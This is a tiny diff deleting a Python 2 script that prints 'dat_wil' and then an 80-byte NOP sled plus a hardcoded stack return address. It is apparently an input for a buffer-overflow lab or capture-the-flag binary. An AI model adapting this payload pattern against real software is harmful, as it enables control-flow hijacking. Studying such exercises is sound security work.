@@ -1,2 +1,0 @@
-print "dat_wil"
-print "\x90" * 80 + "\xec\xd6\xff\xff"
